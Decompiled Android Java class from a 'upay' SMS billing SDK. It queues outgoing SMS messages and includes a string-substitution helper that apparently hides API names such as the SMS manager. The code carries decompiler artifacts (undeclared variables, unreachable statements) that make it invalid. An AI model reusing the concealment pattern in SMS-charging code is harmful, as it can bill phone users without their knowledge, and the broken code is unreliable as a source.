package com.upay.billing.engine;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Trade;
import com.upay.billing.utils.Util;
import java.util.LinkedHashMap;

public class MessageRunner
  implements Runnable
{
  private static final String MSG_ID = "upay.message.id";
  private static final String SMS_SENT_ACTION = "com.upay.billing.util.SmsSentAction";
  private static final String TAG = "MessageRunner";
  private static int maxId;
  private static LinkedHashMap<Integer, MessageRunner> queue = new LinkedHashMap();
  private static BroadcastReceiver receiver = new MessageRunner.1();
  private static boolean registered;
  private static Thread worker = new MessageRunner.2();
  private Context context;
  private long createTime;
  private int id;
  private String msg;
  private String num;
  private int retryCount = 0;
  private StringBuffer sb;
  private boolean sending = false;
  private String tagMsg;
  private int timeout = 60000;
  
  static
  {
    maxId = 1;
    registered = false;
  }
  
  public MessageRunner(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    this.context = paramContext;
    this.num = paramString1;
    this.msg = paramString2;
    this.tagMsg = paramString3;
    this.timeout = Integer.parseInt(UpayCore.getInstance(paramContext).getPropString("common", "send_sms_timeout", "60000"));
    if (needRetry()) {
      i = 2;
    }
    this.retryCount = i;
    this.sb = new StringBuffer();
    try
    {
      i = maxId;
      maxId = i + 1;
      this.id = i;
      return;
    }
    finally {}
  }
  
  private boolean needRetry()
  {
    boolean bool2 = false;
    try
    {
      String str = UpayCore.getInstance(this.context).getCurrentTrade().appKey;
      Object localObject = UpayCore.getInstance(this.context).getPropString("common", "not_show_loading", "");
      boolean bool1 = bool2;
      int i;
      if (!Util.empty((String)localObject))
      {
        localObject = ((String)localObject).split("&");
        i = 0;
      }
      for (;;)
      {
        bool1 = bool2;
        if (i < localObject.length)
        {
          bool1 = str.equals(localObject[i]);
          if (bool1) {
            bool1 = true;
          }
        }
        else
        {
          return bool1;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception localException) {}
  }
  
  private static String simpleDec(String paramString)
  {
    return paramString.replace('1', 'M').replace('2', 's').replace('3', 'm').replace('4', 'e').replace('5', 'a').replace('6', 't');
  }
  
  public String getMessage()
  {
    return this.msg;
  }
  
  public String getNumber()
  {
    return this.num;
  }
  
  protected void onFailed(int paramInt, String paramString) {}
  
  protected void onSuccess(String paramString1, String paramString2, int paramInt) {}
  
  public void run()
  {
    synchronized (worker)
    {
      if (!registered)
      {
        this.context.registerReceiver(receiver, new IntentFilter("com.upay.billing.util.SmsSentAction"));
        worker.start();
        registered = true;
      }
    }
    synchronized (queue)
    {
      queue.put(Integer.valueOf(this.id), this);
      return;
      localObject2 = finally;
      throw localObject2;
    }
  }
  
  public MessageRunner setTimeout(int paramInt)
  {
    this.timeout = paramInt;
    return this;
  }
}
